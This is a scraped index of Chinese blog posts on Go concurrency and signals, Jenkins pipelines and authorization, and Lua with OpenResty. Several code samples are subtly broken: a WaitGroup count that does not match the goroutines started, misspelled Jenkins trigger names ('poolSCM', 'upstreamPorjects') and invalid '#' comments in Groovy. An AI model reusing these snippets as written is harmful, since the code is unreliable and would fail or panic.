process，轻量级的进程，是程序执行中一个单一的顺序控制流程，在Linux操作系统下，线程的本质仍是进程。\n线程有独立的PCB，但没有独立的地址空间，各个线程之间共享程序的内存空间。\n进程和线程的区别 进程：最小分配资源单位，可看成是只有一个线程的进程。 线程：最小的执行单位 一个进程由一个或多个线程组成 进程之间相互独立，同一进程下的各个线程之间共享程序的内存空间 协程并发 协程 coroutines，是一种基于线程之上，但又比线程更加轻量级的存在，这种由程序来管理的轻量级线程叫做『用户空间线程』，具有对内核来说不可见的特性。\n多数语言在语法层面并不直接支持协程，而是通过库的方式支持，但用库的方式支持的功能也并不完整，比如仅仅提供协程的创建、销毁与切换等能力。如果在这样的轻量级线程中调用一个同步 IO 操作，比如网络通信、本地文件读写，都会阻塞其他的并发执行轻量级线程，从而无法真正达到轻量级线程本身期望达到的目标。\n协程和线程的区别 占用资源：线程，初始单位为1MB,固定不可变；协程初始一般为 2KB，可随需要而增大。 调度：线程，由操作系统内核完成，协程，由用户完成。 性能： 线程，占用资源高，频繁创建销毁带来性能问题。占用资源小，不会带来严重的性能问题。 数据： 线程，多线程需要锁机制确保数据一致性和可见性；而线程因为只有一个进程，不存在同时读/写冲突，协程中控制共享数据不用加锁，顾执行效率较线程高。 Go并发 goroutine Go语言在语言级别支持协程，叫goroutine。Go语言标准库提供的所有系统调用操作（包括所有同步IO操作），都会出让CPU给其他goroutine。这种轻量级线程的切换管理不依赖于系统的线程和进程，也不需要依赖于CPU的核心数量。\nGo语言为并发编程而内置的上层API基于顺序通信进程模型CSP(communicating sequential processes)。这就意味着显式锁都是可以避免的，因为Go通过相对安全的通道发送和接受数据以实现同步，这大大地简化了并发程序的编写。\nGo语言中的并发程序主要使用两种手段来实现。goroutine和channel。\n什么是goroutine Go语言作者Rob Pike说， “Goroutine是一个与其他goroutines并发运行在同一地址空间的Go函数或方法。一个运行的程序由一个或更多个goroutine组成。它与线程、协程、进程等不同。它是一个goroutine*。\ngoroutine是Go并行设计的核心。goroutine说到底其实就是协程，它比线程更小，十几个goroutine可能体现在底层就是五六个线程，Go语言内部帮你实现了这些goroutine之间的内存共享。执行goroutine只需极少的栈内存(大概是4~5KB)，当然会根据相应的数据伸缩。也正因为如此，可同时运行成千上万个并发任务。goroutine比thread更易用、更高效、更轻便。\nMPG模型 M 操作系统的线程抽象，一个M直接关联了一个内核线程；代表着真正执行计算的资源。 P Processor，提供相关执行环境的上下文，处理用户级代码逻辑的处理器，P的数量由用户设置的GOMAXPROCS决定，但是不论GOMAXPROCS设置为多大，P的数量最大为256。 G Goroutine，G并非执行体，每个G需要绑定到P才能被调度执行。\n在操作系统每一个线程都有一个固定大小的块来做栈，这个栈会用来存储当前正在被调用或挂起(指在调用其它函数时)的函数的内部变量。\n在Go语言中，每一个goroutine是一个独立的执行单元，goroutine的栈采取了动态扩容方式， 初始时仅为2KB，随着任务执行按需增长，最大可达1GB（64最大1G，32位最大256M）\n上图，图中P正在执行的Goroutine为蓝色的，处于待执行状态的Goroutine为灰色的，灰色的Goroutine形成了一个队列runqueues。\n在这里，当一个P关联多个G时，就会处理G的执行顺序，就是并发，当一个P在执行一个协程工作时，其他的会在等待，当正在执行的协程遇到阻塞情况，例如IO操作等，go的处理器就会去执行其他的协程，因为对于类似IO的操作，处理器不知道你需要多久才能执行结束，所以他不回去等你执行完。\nRreferences go语言并发编程 进程和线程 a groutine之间的调度\n","permalink":"https://www.oomkill.com/2019/10/go-goroutine/","summary":"","title":"go语言的并发编程gorouting"},{"content":"string in mutual conversion // int to int64\rm := int64(n)\r// int64 to int\rn := int(m)\r// string to int\rint,err := strconv.Atoi(string)\r// string to int64\rint64, err := strconv.ParseInt(string, 10, 64)\r// int to string\rstring := strconv.Itoa(int)\r// int64 to string\rstring := strconv.FormatInt(int64,10)\r// custom type string to string\r// useful link\r// https://stackoverflow.com/questions/45891600/converting-a-custom-type-to-string-in-go\rtype CustomType string\rFoobar CustomType = \u0026quot;somestring\u0026quot;\r// error\rvar a string\ra = Foobar\r// correct\rvar a string\ra = string(Foobar)\rslice to struct Question: in golang how to convert slice to struct\nscene 1：use reflect convert slice to struct func SliceToStruct(array interface{}) (forwardPort *ForwardPort, err error) {\rforwardPort = \u0026amp;ForwardPort{}\rvalueOf := reflect.ValueOf(forwardPort)\rif valueOf.Kind() != reflect.Ptr {\rreturn nil, errors.New(\u0026quot;must ptr\u0026quot;)\r}\rvalueOf = valueOf.Elem()\rif valueOf.Kind() != reflect.Struct {\rreturn nil, errors.New(\u0026quot;must struct\u0026quot;)\r}\rswitch array.(type) {\rcase []string:\rarrayImplement := array.([]string)\rfor i := 0; i \u0026lt; valueOf.NumField(); i++ {\rif i \u0026gt;= len(arrayImplement) {\rbreak\r}\rval := arrayImplement[i]\rif val != \u0026quot;\u0026quot; \u0026amp;\u0026amp; reflect.ValueOf(val).Kind() == valueOf.Field(i).Kind() {\rvalueOf.Field(i).Set(reflect.ValueOf(val))\r}\r}\rcase []interface{}:\rarrayImplement := array.([]interface{})\rfor i := 0; i \u0026lt; valueOf.NumField(); i++ {\rif i \u0026gt;= len(arrayImplement) {\rbreak\r}\rval := arrayImplement[i]\rif val != \u0026quot;\u0026quot; \u0026amp;\u0026amp; reflect.ValueOf(val).Kind() == valueOf.Field(i).Kind() {\rvalueOf.Field(i).Set(reflect.ValueOf(val))\r}\r}\r}\rreturn forwardPort, nil\r}\rstruct to anything https://github.com/fatih/structs\nbyte json to map json实例如下所示，要求转换结果是需要data，这个是haproxy dataplane api的数据结构\n{\r\u0026quot;_version\u0026quot;: 14,\r\u0026quot;data\u0026quot;: [\r{\r\u0026quot;name\u0026quot;: \u0026quot;http\u0026quot;,\r\u0026quot;address\u0026quot;: \u0026quot;127.0.0.1\u0026quot;,\r\u0026quot;port\u0026quot;: 80\r}\r]\r}\r此时无需定义一个结构体，使用 map即可完成\n// frist, define a map struct\rbindList := map[string][]models.Bind{}\r// convert with json.Unmarshal\rjson.Unmarshal(resp, \u0026amp;bindList)\rNotes：这里不要去判断error，因为\u0026quot;_version\u0026quot; 字段是一个int类型，必然是 != nil ，转换时正确格式的会被转换，错误格式则被忽略报错了\n","permalink":"https://www.oomkill.com/2019/10/goskill-golang-type-convert/","summary":"","title":"Go语言数据类型转换"},{"content":"什么是信号 在计算机科学中，信号是Unix、类Unix以及其他POSIX兼容的操作系统中进程间通讯的一种有限制的方式。它是一种异步的通知机制，用来提醒进程一个事件已经发生。\n当一个信号发送给一个进程，操作系统中断了进程正常的控制流程，如果进程定义了对信号的处理，此时，程序将进入捕获到的信号对应的处理函数，否则执行默认的处理函数。\nLinux中信号的介绍 在Linux系统共定义了64种信号，分为两大类：实时信号与非实时信号，1-31为非实时，32-64种为实时信号。\n非实时信号： 也称为不可靠信号，为早期Linux所支持的信号，不支持排队，信号可能会丢失, 比如发送多次相同的信号, 进程只能收到一次. 信号值取值区间为1~31； 实时信号： 也称为可靠信号，支持排队, 信号不会丢失, 发多少次, 就可以收到多少次. 信号值取值区间为32~64 Linux操作系统中，在终端上执行 kill -l 便可看到系统定义的所有信号\n信号表 POSIX.1-1990标准信号 此表参考自：POSIX信号\n信号 值 动作 说明 SIGHUP 1 Term 终端控制进程结束(终端连接断开) SIGINT 2 Term 用户发送INTR字符(Ctrl+C)触发 SIGQUIT 3 Core 用户发送QUIT字符(Ctrl+/)触发 SIGILL 4 Core 非法指令(程序错误、试图执行数据段、栈溢出等) SIGABRT 6 Core 调用abort函数触发 SIGFPE 8 Core 算术运行错误(浮点运算错误、除数为零等) SIGKILL 9 Term 无条件结束程序(不能被捕获、阻塞或忽略) SIGSEGV 11 Core 无效内存引用(试图访问不属于自己的内存空间、对只读内存空间进行写操作) SIGPIPE 13 Term 消息管道损坏(FIFO/Socket通信时，管道未打开而进行写操作) SIGALRM 14 Term 时钟定时信号 SIGTERM 15 Term 结束程序(可以被捕获、阻塞或忽略) SIGUSR1 30,10,16 Term 用户保留 SIGUSR2 31,12,17 Term 用户保留 SIGCHLD 20,17,18 Ign 子进程结束(由父进程接收) SIGCONT 19,18,25 Cont 继续执行已经停止的进程(不能被阻塞) SIGSTOP 17,19,23 Stop 停止进程(不能被捕获、阻塞或忽略) SIGTSTP 18,20,24 Stop 停止进程(可以被捕获、阻塞或忽略) SIGTTIN 21,21,26 Stop 后台程序从终端中读取数据时触发 SIGTTOU 22,22,27 Stop 后台程序向终端中写数据时触发 更多的信号说明请查阅man7\n此表的操作为每个信号的默认配置，如下所示\n动作 说明 Term 默认操作是，终止进程。 Ign 默认操作是，忽略信号。 Core 默认操作是，终止该进程并核心转储 Stop 默认操作是，停止进程。 Cont 默认操作是，如果当前已停止，则继续该进程。 信号的产生 信号是事件发生时对进程的通知机制。信号中断与硬件中断的相似之处在于打断了程序执行的正常流程。\n信号事件的来源分为软件信号和硬件信号：\n硬件信号： 用户输入：比如在终端上按下组合键ctrl+C，产生SIGINT信号；硬件异常：CPU检测到内存非法访问等异常，通知内核生成相应信号，并发送给发生事件的进程； 软件信号： 通过系统调用： 如，发送signal信号：kill，raise等。 发送的信号 Ctrl-C 发送 INT signal (SIGINT)，通常导致进程结束 Ctrl-Z 发送 TSTP signal (SIGTSTP); 通常导致进程挂起(suspend) Ctrl-\\ 发送 QUIT signal (SIGQUIT); 通常导致进程结束 和 dump core. 信号的处理 内核处理进程收到的signal是在当前进程的上下文，故进程必须是Running状态。当进程唤醒或者调度后获取CPU，则会从内核态转到用户态时检测是否有signal等待处理，处理完，进程会把相应的未决信号从链表中去掉。\nsignal信号处理时机： 内核 ==\u0026gt; 信号处理 ==\u0026gt; 用户\n内核态：在内核态，signal信号不起作用； signal信号处理: 在用户态，signal所有未被屏蔽的信号都处理完毕；当屏蔽信号，取消屏蔽时，会在下一次内核转用户态的过程中执行； 信号处理方式 进程对信号的处理方式有3种：\n默认 接收到信号后按默认的行为处理该信号。 这种方式为多数应用采取的处理方式。 自定义处理 用自定义的信号处理函数来执行特定的动作 忽略忽略信号 接收到信号后不做任何反应。 对信号的处理动作：\nTerm： 中止进程 Ign： 忽略信号 Core： 中止进程并保存内存信息 Stop： 停止进程 Cont： 继续运行进程 Linux信号命令 kill kill命令用来终止指定的进程, 对于一个后台进程就须用kill命令来终止，我们就需要先使用ps/pidof/pstree/top等工具获取进程PID，然后使用kill命令来杀掉该进程。\n命令格式 kill[参数] [进程id]\n命令参数 -l 信号，若果不加信号的编号参数，则使用“-l”参数会列出全部的信号名称 -a 当处理当前进程时，不限制命令名和进程号的对应关系 -p 指定kill 命令只打印相关进程的进程号，而不发送任何信号 -s 指定发送信号 -u 指定用户\nkillall Linux系统中的killall用于杀死指定名字的进程（kill processes by name）。我们可以使用kill命令杀死指定进程PID的进程，如果要找到我们需要杀死的进程，我们还需要在之前使用ps等命令再配合grep来查找进程，而killall把这两个过程合二为一，是一个很好用的命令。\n命令格式 killall[参数] [进程名]\n命令参数 -I 忽略小写 -a 当处理当前进程时，不限制命令名和进程号的对应关系 -i 交互模式，杀死进程前先询问用户 -s 发送指定的信号 -w 等待进程死亡 -e 要求匹配进程名称\nPKILL pkill 与 killall 使用方法类似，用于杀死指定名称的进程\nGo语言中的Signal的使用 在Go语言中，处理信号仅需要3个步骤即可完成对信号的处理\n信号的接收： signalChan := make(chan os.Signal,1) 信号的监听捕获： signal.Notify(signalChan) 信号的触发： signal := \u0026lt;-signalChan 注意事项：\nSIGKILL kill -9和SIGSTOP kill -19 信号可能不会被Notify方法捕获，因此无法处理这些信号。 如果在Notify方法中没有指定信号作为参数，那么该方法将捕获所有的信号。 在Go语言中的Signal的处理 在某些场景下，如，在大量并发及，批量处理未完成时，此时需要在Go程序中处理Signal信号，比如收到SIGTERM信号后优雅的关闭程序。\n实例：在一个计算场景下，有5个goroutine在处理业务，当收到 kill -15时计算完成后退出程序， kill -4不做处理。\npackage main import ( \u0026quot;fmt\u0026quot; \u0026quot;os\u0026quot; \u0026quot;os/signal\u0026quot; \u0026quot;sync\u0026quot; \u0026quot;syscall\u0026quot; \u0026quot;time\u0026quot; ) var wg sync.WaitGroup func exitProcess() { fmt.Println(\u0026quot;等待进程完成\u0026quot;) wg.Wait() fmt.Println(\u0026quot;进程退出\u0026quot;) } func process(n int) { i := n for { fmt.Println(\u0026quot;process\u0026quot;, n, \u0026quot;:\u0026quot;, i) if i \u0026gt; 100 { break } time.Sleep(time.Second) i++ } fmt.Println(\u0026quot;process\u0026quot;, n, \u0026quot;finnshed\u0026quot;) defer wg.Done() } func main() { signals := make(chan os.Signal, 1) done := make(chan bool, 1) signal.Notify(signals, syscall.SIGILL, syscall.SIGTERM) go func() { for signal := range signals { switch signal { case syscall.SIGTERM, syscall.SIGQUIT: fmt.Println(\u0026quot;kill -15 进程退出\u0026quot;) exitProcess() case syscall.SIGILL: fmt.Println(\u0026quot;kill -4\u0026quot;) } } done \u0026lt;- true }() wg.Add(5) for n := 0; n \u0026lt; 10; n++ { go process(n) } fmt.Println(\u0026quot;waiting signal...\u0026quot;) wg.Wait() fmt.Println(\u0026quot;exiting\u0026quot;) } 收到kill -4 信号打印kill -4\n收到kill -15 信号后，带程序处理完成后退出\n","permalink":"https://www.oomkill.com/2019/10/go-signal/","summary":"","title":"Go中的signal处理"},{"content":"pipline demo https://jenkins.io/zh/doc/book/pipeline/syntax/ git 插件 https://jenkins.io/doc/pipeline/steps/git/ pipeline{\ragent any\rstages{\rstage(\u0026quot;build\u0026quot;){\rsteps{\recho \u0026quot;11111\u0026quot;\r}\r}\r}\r}\rpipeline总体介绍 基本结构\n以下每一个部分都是必须的，少一个Jenkins都会报错\npipeline{\ragent any\rstages{\rstage(\u0026quot;build\u0026quot;){\rsteps{\recho \u0026quot;hellp\u0026quot;\r}\r}\r}\r}\rpipeline 代表整个流水线，包含整条流水线的逻辑 stage 阶段，代表流水线的阶段，每个阶段都必须有名称。 stages 流水线中多个stage的容器，stages部分至少包含一个stage. steps 代表stage中的一个活多个具体步骤的容器，steps部分至少包含一个步骤 agent 制定流水线的执行位置，流水线中每个阶段都必须在某个地方执行（master节点/slave节点/物理机/虚拟机/docker容器），agent部分指定具体在哪里执行。agent { label '***-slave'} 可选步骤\npost 包含的是在整个pipeline或stage完成后的附件条件\nalways 论Pipeline运行的完成状态如何都会执行这段代码 changes 只有当前Pipeline运行的状态与先前完成的Pipeline的状态不同时，才能触发运行。 failure 当前状态为失败时执行 success 当前完成状态为成功时执行 demo\n使用${test}，可以引入自定义变量\npost {\ralways {\rscript {\rallure includeProperties: false, jdk: '',report: 'jenkins-allure-report', results: [[path: 'allure-results']] }\r}\rfailure {\rscript {\rif (gitpuller == 'noerr') {\rmail to: \u0026quot;${email_list}\u0026quot;,\rsubject: \u0026quot;[jenkins Build Notification] ${JOB_NAME} - Build # ${BUILD_NUMBER} 构建失败\u0026quot;,\rbody: \u0026quot;'${env.JOB_NAME}' (${env.BUILD_NUMBER}) 执行失败\\n请及时前往 ${env.BUILD_URL} 进行查看\u0026quot;\r} else {\recho 'scm pull err ignore send mail'\r}\r}\r}\r}\rpipeline支持的指令\nenvironment：用于设置环境变量，可以定义在stage或pipeline部分，环境变量可以向下面的示例设置为全局的，也可以是阶段stage级别的。如你所想，阶段stage级别的环境变量只能在定义变量的阶段stage使用。\ntools：可定义在pipeline或stage部分，会自动下载并安装我们指定的工具，并将其加入到PATH变量中\ninput：定义在stage部分，会暂停pipeline，提示你输入内容\noptions：用于配置Jenkins pipeline本身的选项，options指令可以定义在stage或pipeline部分\nparallel：并行执行多个step\nparameters：与input不同，parameters时执行pipeline前传入的一些参数\ntriggers：定义执行pipeline的触发器\nwhen：当满足when条件时，阶段才会执行 在使用指令时注意每个指令都有自己的作用域，如果指令使用的位置不正确，Jenkins会报错\n变量定义（全局）\n通过def project_name，定义job名称 通过def upstream_list= \u0026lsquo;,\u0026rsquo; 定义上游job名称，用在触发器里面\noptions\n用于配置整个pipeline本身的选项\nbuildDiscarder 保存最近历史构建记录的数量\ndisableConcurrentBuilds 同一个pipline，Jenkins是默认可以同时执行多次的，此选项是为了禁止pipeline同时执行\nretry：当发生失败是进行重试retry(4)\noptions {\rbuildDiscarder{logRotator(numToKeepStr: '30')} # 保存最近x个job执行记录\rtimeout(time:1, unit: 'HOURS') # 1小时内未执行完，自动结束\rdisableConcurrentBuilds() # 不允许两个job同时执行\r}\rparameters\n该parameters指令提供用户在触发Pipeline时应提供的参数列表。这些用户指定的参数的值通过该params对象可用于Pipeline步骤\n字符串类型的参数，例如：parameters { string(name: 'DEPLOY_ENV', defaultValue: 'staging', description: '') }\nbooleanParam，一个布尔参数，例如：booleanParam(name: 'DEPLOY_BUILD', defaultValue: true, description: '') }\n目前支持[booleanParam, choice, credentials ,file, test, password, run, string]\nparameters {\rchoice(name: 'environ',choices: 'test\\ndev\\nstg', description: '测试环境，请选择dev? test? stg? ')\rstring(name: 'keywords', defaultValue: '', description: '测试用例名的关键字，用于过滤测试用例')\rstring(name: 'folder', defaultValue: '', description: '文件夹名称，用于指定具体包那个文件夹下的case')\r}\rtriggers配置\ntriggers指定定义了流水线被重新出发的自动化方法。当前可用的触发器是cron, pollSCM, upstream, gitlab。例如\ntriggers {\rpoolSCM('H * * * 1-5') // 周一到周五，每小时\rcron('H H * * *') // 每天\rgitlab(triggerOnPush: true, triggerOnMergeRequest: false, branchFilterType: 'All')\rupstream(upstreamPorjects: \u0026quot;${upstream_list}\u0026quot;, threshold: hudson.model.Result.SUCCESS)\r}\r定时触发：cron\n接收cron样式的字符串来定义要重新出发流水线的常规间隔，比如cron('H H * * *') ，每天轮询代码仓库：pollSCM\n接收cron样式的字符串来定义一个固定的间隔，在这个间隔中，Jenkins会检查新的源代码更新。如果存在更改，流水线就会被重新出发。例如pollSCM(\u0026lsquo;H * * * 1-5\u0026rsquo;) 周一到周五，每小时\n由上游任务触发：upstream\n接受逗号分割的工作字符串和阈值，当字符串中的任何作业以最小阈值结束时，流水线被重新触发。例如：triggers { upstream(upstreamPorjects: \u0026quot;job1,job2\u0026quot;, threshold: hudson.model.Result.SUCCESS) }\nhudson.model.Result包括以下状态：\nABORTED：任务被手动终止， FAILURE：构建失败 SUCCESS：构建成功 UNSTABLE：存在一些错误，但构建没失败 NOT_BUILT：多阶段构建时，前面阶段问题导致后面阶段无法执行 由gitlab触发：gitlab gitlab(triggerOnPush: true, triggerOnMergeRequest: false, branchFilterType: 'All')，更改后push到远端。\ntriggerOnPush: true 代表有push就会触发job triggerOnMergeRequest: false 代码有merge不会触发 branchFilterType: 'All' 所有分支均会触发 https://blog.csdn.net/qq_30758629/article/details/93353437\nenvironment {\rgit_url = 'https://gitlab.com/lc.chow/jenkins-test.git'\rgit_key = '176b96d4-0865-4cb8-871d-f9b65a84cecc'\rgit_branch = 'master'\rgitpullerr = 'noerr'\remail_list = 'test.com@gmail.com'\r}\roptions {\rbuildDiscarder{logRotator(numToKeepStr: '30')} # 保存最近x个job执行记录\rtimeout(time:1, unit: 'HOURS') # 1小时内未执行完，自动结束\rdisableConcurrentBuilds() # 不允许两个job同时执行\r}\rparameters {\rchoice(name: 'environ',choices: 'test\\ndev\\nstg', description: '测试环境，请选择dev? test? stg? ')\rstring(name: 'keywords', defaultValue: '', description: '测试用例名的关键字，用于过滤测试用例')\rstring(name: 'folder', defaultValue: '', description: '文件夹名称，用于指定具体包那个文件夹下的case')\r}\rstags {\rstage('拉去测试代码') {\rsteps {\rgit branch: \u0026quot;${git_branch}\u0026quot;, credentialsId: \u0026quot;$git_key\u0026quot;, url: \u0026quot;$git_url\u0026quot;\r}\r}\rstage('安装测试依赖') {\rsteps {\rsh \u0026quot;pipenv --rm\u0026quot;\rsh \u0026quot;pipenv install --skip-lock --ignore-pipfile\u0026quot;\rsh \u0026quot;pipenv graph\u0026quot;\r}\r}\rstage('执行测试用例') {\rsteps {\rsh \u0026quot;rm -fr $env.WORKSPACE/allure-*\u0026quot;\rsh \u0026quot;pipenv run py.test --env '${params.environ}' -k '${params.keywords}' tests/{params.folder}\u0026quot;\r}\r}\r}\rpost {\ralways {\r}\r}\rdemo pipeline {\ragent any\rstages {\rstage('Depoly pay13'){\rsteps {\rsshPublisher(publishers: [sshPublisherDesc(configName: '52.229.166.83 pay13', transfers: [sshTransfer(cleanRemote: false, excludes: '', execCommand: \u0026quot;cd /data/paysCenter \u0026amp;\u0026amp; sudo git pull \u0026amp;\u0026amp; sudo chown -R nginx.nginx /data/paysCenter\u0026quot;, execTimeout: 120000, flatten: false, makeEmptyDirs: false, noDefaultExcludes: false, patternSeparator: '[, ]+', remoteDirectory: '', remoteDirectorySDF: false, removePrefix: '', sourceFiles: '')], usePromotionTimestamp: false, useWorkspaceInPromotion: false, verbose: false)]) sshPublisher(publishers: [sshPublisherDesc(configName: '52.229.166.83 pay13', transfers: [sshTransfer(cleanRemote: false, excludes: '', execCommand: 'cd /data/paysCenter \u0026amp;\u0026amp; sudo git pull \u0026amp;\u0026amp; echo `git show|head -1|awk \\'{print $2}\\'`', execTimeout: 120000, flatten: false, makeEmptyDirs: false, noDefaultExcludes: false, patternSeparator: '[, ]+', remoteDirectory: '', remoteDirectorySDF: false, removePrefix: '', sourceFiles: '')], usePromotionTimestamp: false, useWorkspaceInPromotion: false, verbose: false)])\r}\r}\r}\rpost {\rsuccess {\rsh '''\recho \u0026quot;push success\u0026quot;\r'''\r}\rfailure {\rsh '''\recho \u0026quot;push fail\u0026quot;\r'''\r}\r}\r}\rpipeline{\ragent any\renvironment {\rhost = \u0026quot;192.168.50.32\u0026quot;\rpath1 = \u0026quot;/data/appdown\u0026quot;\r}\roptions {\rtimeout(time: 1, unit: 'HOURS')\rbuildDiscarder(logRotator(numToKeepStr: '100'))\rdisableConcurrentBuilds()\r}\rstages{\rstage(\u0026quot;pull\u0026quot;){\rsteps{\rgit branch: 'pre', credentialsId: 'abe7e165-b646-472e-ab48-024004ecc589', url: 'http://j7.hnxmny.com:8088/a/front/appdown'\r}\r}\rstage(\u0026quot;build\u0026quot;){\rsteps{\rwithEnv(['PATH+EXTRA=/usr/sbin:/usr/bin:/sbin:/bin']) {\rsh \u0026quot;sudo npm i \u0026amp;\u0026amp; sudo npm run isol\u0026quot;\r}\r}\r}\rstage(\u0026quot;deploy\u0026quot;){\rsteps{\rsh '''\rfile=`date +%Y%m%d%H%M%S`\rsudo mv dist dist.${file}\rtar zcf dist.${file}.tar.gz dist.${file}\ransible ${host} -b -m copy -a \u0026quot;src=dist.${file}.tar.gz dest=/tmp/\u0026quot;\ransible ${host} -b -m raw -a \u0026quot;tar xf /tmp/dist.${file}.tar.gz -C ${path1}/ \u0026amp;\u0026amp; rm -f /tmp/dist.${file}.tar.gz\u0026quot;\ransible ${host} -b -m raw -a \u0026quot;ln -svnf ${path1}/dist.${file} ${path1}/dist\u0026quot;\r'''\r}\r}\r}\rpost {\rcleanup {\recho 'One way or another, I have finished'\rdeleteDir() /* clean up our workspace */\r}\r}\r}\rpipline 报错\nnohup: failed to run command ‘sh’: No such file or directory\rSending interrupt signal to process\r原因：environment设置了path环境变量导致重写出现的原因\nenvironment {\rhost = \u0026quot;192.168.50.32\u0026quot;\rpath1 = \u0026quot;/data/appdown\u0026quot;\r}\r解决方法：\nhttps://stackoverflow.com/questions/43987005/jenkins-does-not-recognize-command-sh withEnv\nnode {\rstage ('STAGE NAME') {\rwithEnv(['PATH+EXTRA=/usr/sbin:/usr/bin:/sbin:/bin']) {\rsh '//code block'\r}\r}\r}\r避免使用系统环境变量名称 进入某个路径下操作\n执行完后会退回原目录\ndir(path: 'ssr-server') {\rsh '''2\rrm -fr node_modules \u0026amp;\u0026amp; npm install\rnpm run prestart:prod\r'''\r}\r使用参数\nparameters {\rchoice(name: 'vernum',choices: 'v1\\nv2', description: '请选择v1? v2?')\r}\rif\nstage(\u0026quot;build\u0026quot;){\rsteps{\rscript {\rif ( params.vernum == 'v1' ) {\rdir(path: 'v1') {\rsh '''\rnpm i\r'''\r}\r} else {\rdir(path: 'v2') {\rsh '''\rnpm i\r'''\r}\r}\r}\r}\r}\r","permalink":"https://www.oomkill.com/2019/10/jenkins-pipline-demo/","summary":"","title":"jenkins pipline demo"},{"content":"需要安装的插件 Role-Based Strategy（可以对构建的项目进行授权管理，让不同的用户管理不同的项目，将测试和生产环境分开）\n选择授权策略 当Role-based Authorization Strategy 这个插件安装好之后，授权策略会多出一个Role-Based Strategy 选项，选择此项\n添加配置权限 系统设置 \u0026raquo; Manage and Assign Roles\nManage Roles 设置全局角色（全局角色可以对jenkins系统进行设置与项目的操作）\nadmin:对整个jenkins都可以进行操作 root:可以对所有的job进行管理 other:只有读的权限 other必须有，否则给用户分配角色时分配没有全局role会导致分配失效 Assign Roles为用户指派角色 项目角色是根据正则匹配的，\n","permalink":"https://www.oomkill.com/2019/10/jenkins-user-authentication/","summary":"","title":"jenkins的用户授权与管理"},{"content":"文中的代码来自可以从github下载： https://github.com/ciandcd\n插件 jobConfigHistory，可以查看job配置的修改历史。\n安装后重启jenkins，然后对job的配置修改后，可以点击job config history连接查看修改历史。\n选择需要比较的版本，可以diff两个版本间的差别。\n","permalink":"https://www.oomkill.com/2019/10/jenkins-recode-history/","summary":"","title":"jenkins历史比较"},{"content":"修改启动用户\n先停止jenkins服务\nsudo launchctl unload /Library/LaunchDaemons/org.jenkins-ci.plist\rsudo vim /Library/LaunchDaemons/org.jenkins-ci.plist\r授权jenkins工作目录和临时目录\nsudo chown -R zhulangren:wheel /Users/Shared/Jenkins/\rsudo chown -R zhulangren:wheel /var/log/jenkins/\r启动jenkins\nsudo launchctl load /Library/LaunchDaemons/org.jenkins-ci.plist\rjenkins自启动文件路径\n/Library/LaunchDaemons/org.jenkins-ci.plist\r卸载脚本文件\n/Library/Application\\ Support/Jenkins/Uninstall.command\r修改jenkins启动端口\nsudo defaults write /Library/Preferences/org.jenkins-ci httpPort '9999'\r读取jenkins配置文件\ndefaults read /Library/Preferences/org.jenkins-ci\r设置自启动\nsudo launchctl load /Library/LaunchDaemons/org.jenkins-ci.plis\r取消自启动\nsudo launchctl unload /Library/LaunchDaemons/org.jenkins-ci.plist\rjenkins war路径\n/Applications/Jenkins/jenkins.war\rReference\nMac Jenkins 权限问题\n","permalink":"https://www.oomkill.com/2019/10/jenkens-migrant-in-macos/","summary":"","title":"jenkins在Mac OS下的迁移记录"},{"content":"cjson下载\nhttps://github.com/mpx/lua-cjson.git\n下载解压后，编译需要根据自己的lua环境以及操作系统修改Makefile的一些配置，不然容易出错。 以下是Makefile中的一些配置。\nLUA_VERSION = 5.2\rTARGET = cjson.so\rPREFIX = /usr/local\rCJSON_LDFLAGS = -shared\rLUA_INCLUDE_DIR = $(PREFIX)/include\rLUA_CMODULE_DIR = $(PREFIX)/lib/lua/$(LUA_VERSION)\rLUA_MODULE_DIR = $(PREFIX)/share/lua/$(LUA_VERSION)\rLUA_BIN_DIR = $(PREFIX)/bin\rhttps://blog.gezhiqiang.com/2017/08/24/lua-cjson/\nlocal cjson = require(\u0026quot;cjson\u0026quot;)\rlocal obj = {\rid = 1,\rname = \u0026quot;zhangsan\u0026quot;,\rage = nil,\ris_male = false,\rhobby = {\u0026quot;zhangsan\u0026quot;,\u0026quot;lisi\u0026quot;,\u0026quot;wangwu\u0026quot;}\r}\rlocal str = cjson.encode(obj)\rngx.say(str)\r","permalink":"https://www.oomkill.com/2019/10/lua-cjson/","summary":"","title":"lua cjson使用"},{"content":"location = /reqq {\rdefault_type text/plain;\rcontent_by_lua_block {\rngx.req.read_body()\rlocal data = ngx.req.get_body_data()\rlocal args, err = ngx.req.get_uri_args()\rif not args then\rngx.say('post fail')\rreturn\rend\rfor key,v in pairs(args) do\rngx.say(key,\u0026quot;::\u0026quot;,v,\u0026quot;--\u0026quot;)\rend\rngx.say(data)\r}\r}\rngx.exec 内部重定向 location = /bb {\rdefault_type text/plain;\rcontent_by_lua_block{\rngx.exec('/reqq?m=DaoShengPay3\u0026amp;c=Pay\u0026amp;orderNo=PH201910111')\r}\r}\rlocation = /reqq {\rdefault_type text/plain;\rcontent_by_lua_block {\rngx.req.read_body()\rlocal data = ngx.req.get_body_data()\rlocal args, err = ngx.req.get_uri_args()\rif not args then\rngx.say('post fail')\rreturn\rend\rfor key,v in pairs(args) do\rngx.say(key,\u0026quot;::\u0026quot;,v,\u0026quot;--\u0026quot;)\rend\rngx.say(data)\r}\r}\rngx.log location = /testlog {\rdefault_type text/plain;\rcontent_by_lua_block{\rngx.say('hello lua log')\rngx.log(ngx.ERR, 'print hello lua log')\r}\r}\r2019/10/12 22:25:31 [error] 468#0: *248 [lua] content_by_lua(nginx.conf:44):3: print hello lua log, client: 203.90.247.72, server: test111.hou2008.com, request: \u0026quot;GET /testlog HTTP/1.1\u0026quot;, host: \u0026quot;test111.hou2008.com:8181\u0026quot;, referrer: \u0026quot;http://test111.hou2008.com/testlog\u0026quot;\rNginx API for Lua https://github.com/openresty/lua-nginx-module\nhttps://www.zifangsky.cn/1024.html\n","permalink":"https://www.oomkill.com/2019/10/lua-nginx-api/","summary":"","title":"lua nginx api"},{"content":"package1 = {}\rpackage1.const = \u0026quot;测试常量\u0026quot;\rfunction package1.func1()\rio.write(\u0026quot;this is public func\\n\u0026quot;)\rend\rreturn package1\rreq.lua\nrequire \u0026quot;package1\u0026quot;\rpackage1.func1()\rprint(package1)\rlc@lc-virtual-machine:~/lua$ lua pack1.lua this is public func\rtable: 0x5575766224a0\r注意事项：\n测试文件是和封装好的模块在同一个目录，否则引用时需要设置路径。\npackage.path = '/home/lc/lua/1/package1.lua;';\rrequire \u0026quot;package1\u0026quot;\rpackage1.func1()\rprint(package1)\r模块名称和文件名称必须相同\n","permalink":"https://www.oomkill.com/2019/10/lua-nginx-module/","summary":"","title":"lua nginx module"},{"content":"Connect-VIServer 